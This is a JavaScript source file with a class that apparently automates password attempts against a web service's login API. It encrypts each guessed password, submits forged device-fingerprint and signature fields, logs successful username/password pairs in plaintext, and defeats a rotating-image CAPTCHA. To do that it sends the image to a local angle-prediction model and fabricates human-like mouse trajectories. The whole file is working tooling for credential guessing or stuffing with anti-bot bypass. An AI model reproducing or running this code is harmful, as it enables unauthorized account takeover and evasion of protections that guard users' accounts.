

import NodeRSA from 'node-rsa';
import Logger from './Logger.js';
import { referUrl } from './MockClient.js';
import { gid, fuid } from './lib/constants.js';
import { getTime } from './utils/index.js';
import Reply from './Reply.js';
import { catchError, from, switchMap } from 'rxjs';
import fetch from 'node-fetch';

class BatchRun {
    #logger = new Logger();
    constructor(username, { s, k, token, as, cookie, fetcher }) {
        this.#logger.info('【start】' + username);
        this.fetcher = fetcher;
        this.s = s;
        this.k = k;
        this.as = as;
        this.token = token;
        this.cookie = cookie;
        this.username = username;
    }
    async run(pass) {
        this.#logger.info('【run】' + JSON.stringify([this.username, pass], null, 0));
        const { tk, ds } = await this.fetcher.getViewLog();
        const { publicKey, key, traceid } = await this.fetcher.fetchPublicKey(
            this.token,
            gid
        );

        const encryptedPassword = this.encryptPassword(pass, publicKey);

        const data = this.getLoginData({ encryptedPassword, key, traceid, ds });

        const loginResult = await this.fetcher.login(data);

        if (loginResult.success) {
            this.#logger.success(
                '【success】 ' + JSON.stringify([this.username, pass], null, 0)
            );
            // 完成
        }

        if (loginResult.isRotateImg) {
            this.#logger.info(`【loginResult isRotateImg】 ${loginResult.isRotateImg}`);
            this.reply({ tk }).pipe(
                switchMap((async ({ f2, error }) => {
                    if (!error) {
                        const data = await this.fetcher.updateDsAndTk({
                            f2,
                            as: this.s,
                            tk: this.k,
                        })
                        this.#logger.warn('##' + data?.data.op + '##');
                    } else {
                        this.#logger.error(`updateDsAndTk 出錯了： 【${f2}，${error}】`);
                    }
                }))
            ).subscribe(res => {
                // console.log(res)
            })
        }

        return {};
    }
    // 加密密码
    encryptPassword(pass, publicKey) {

        try {
            const key = new NodeRSA(publicKey, 'pkcs8-public', {
                encryptionScheme: 'pkcs1',
            });
            // 使用公钥加密密码并进行Base64编码
            const encryptedPassword = key.encrypt(pass, 'base64');

            return encryptedPassword;
        } catch (error) {
            this.#logger.error(`encryptPassword 出錯了： 【${pass}，${publicKey}】`);
        }
    }
    // get login data[🙆]
    getLoginData({ encryptedPassword, key, traceid, tk, ds }) {
        const tt = getTime();
        const data = {
            staticpage: `${referUrl}/cache/user/html/v3Jump.html`,
            charset: 'UTF-8',
            tpl: 'mn',
            subpro: '',
            apiver: 'v3',
            codestring: '',
            safeflg: '0',
            u: `${referUrl}/`,
            isPhone: false,
            detect: '1',
            quick_user: '0',
            logintype: 'dialogLogin',
            logLoginType: 'pc_loginDialog',
            idc: '',
            mkey: '',
            splogin: 'rate',
            mem_pass: 'on',
            isagree: 'on',
            rsakey: key,
            crypttype: '12',
            ppui_logintime: '70218438',
            countrycode: '',
            fp_uid: '',
            fp_info: '',
            loginversion: 'v5',
            supportdv: '1',
            bdint_sync_cookie: '',
            dv: 'tk0.61983360462070381722055026471@ttk0ynARNZ0mQYDEQZ2kNx0RKy06yl09yy2vlxOvyZo7NQ07NzLk3Q2kqZO6GZOmylAgK~AgFdo7sZ0mQ5t5lu53nAMxjt5xhL07nLMiGgrM8oHExT2k0gAg3iAg3QLkHx2kqZGsnoFx8h7GjL5nAtMgsQMxjxN-Gz7WnXr9yg0gNlAg3youy_nk0oIAkp~2kp-A1yQARqx2nFh73D9t5xLMxh75ndQ0GjL5M8RO-FTFvjiOWQSHEFdoksQ2kslA1yl0gtl2nFh73D9t5xLMxh75ndQ0GjLNiG1OET~LkKz09yz0R0Zo73aA1Q5t5lu53nAMxjt5xhL07nLMiAxHWxIDuyiAR3Z0R5Q2ksQ0Rsx2nFh73D9t5xLMxh75ndQ0GjLNiG1OET~Gi8UNuhTN6yl0g3Z07Nx2kszAgqQ2nFh73D9t5xLMxh75ndQ0GjLrWjzOMy_ImmPxmuzTuIWhuk-0zyz2kszAy__wkjDvZy2RHQo7Kg0gHyAkHz0kNy0gKQAgpz0k5x0kp-AkNQhkjPuF~Nu0V2zjiDiNYHWnIru5YH-jX2zQxOWFTrWTYrEt_Akv0R5Z0myQAkty2kpa0myQAkty2k3y0myQAkty2ks~AkqZoksl',
            sig: 'Y3pYUFRNU2dnQ2syZ2VhaC9mTmNTaytWYTc0RXM0eHFIbFZkRHJwTVRzNHR1aWNEKzVheDV1TFZzYUJ1eHcreQ==',
            alg: 'v3',
            elapsed: '2',
            rinfo: `{"fuid":"e6dff83b0c6ccd098414591296a4bf73"}'`,
            shaOne: '000af72aedb153fe9a3d31c135903b9068a8e860',
            traceid,

            s: this.s,
            k: this.k,
            loginmerge: true,
            gid,
            username: this.username,
            password: encryptedPassword,
            tk,
            fuid,
            token: this.token,
            tt,
            time: tt.slice(0, -3),
            ds,
        };
        return data;
    }
    reply({ tk }) {
        this.#logger.info(`reply running ${this.as} ++++`);

        const replyUtil = new Reply(this.cookie, tk, this.as);

        return from(this.fetcher.getStyle({ tk })).pipe(
            switchMap(async (styleContent) => {
                this.#logger.info(`reply running ${styleContent['data']['backstr'].length}`)
                // 
                const backStr = styleContent['data']['backstr'];
                const form = await this.fetcher.getImgFile(styleContent);
                const { predicted_angle: angle } = await this.predict(form);
                const acC = replyUtil.getAcC(angle);
                const ran2 = replyUtil.get_mv2_num(acC);
                const mv2 = replyUtil.generateTrajectorySpin(ran2);
                const ran1 = acC < 0.5 ? 1 : 2;
                const distance = (angle * 238) / 360;
                const mv1 = replyUtil.generateTrajectory(ran1, distance);
                let _str = `{"common":{"cl":[],"mv":${mv1},"sc":[],"kb":[],"sb":[],"sd":[],"sm":[],"cr":{"screenTop":0,"screenLeft":0,"clientWidth":1920,"clientHeight":919,"screenWidth":1920,"screenHeight":1080,"availWidth":1920,"availHeight":1040,"outerWidth":1920,"outerHeight":1040,"scrollWidth":1920,"scrollHeight":1920},"simu":0},"backstr":"${backStr}","captchalist":{"spin-0":{"cr":{"left":815,"top":307,"width":290,"height":280},"back":{"left":884,"top":351,"width":152,"height":152},"mv":${mv2},"ac_c":${acC},"p":{}}}}`.replace(' ', '');

                const key = replyUtil.get_new_key(replyUtil.as);

                const f1 = replyUtil.aesEncrypt(_str, key);
                // getF2

                const need_encrypt = `{"common_en":"${f1}","backstr":"${backStr}"}`.replace(' ', '');
                const key2 = replyUtil.get_new_key(replyUtil.as);

                const f2 = replyUtil.aesEncrypt(need_encrypt, key2);
                return { f2 };
            }),
            catchError((error) => {
                console.error('Error in login request:', error);
                return { error };
            })
        );
    }
    async predict(form) {
        const response = await fetch('http://127.0.0.1:5050/predict', {
            method: 'POST',
            body: form,
            headers: form.getHeaders(),
        });
        const json = await response.json();
        return json;
    }
}

export default BatchRun;
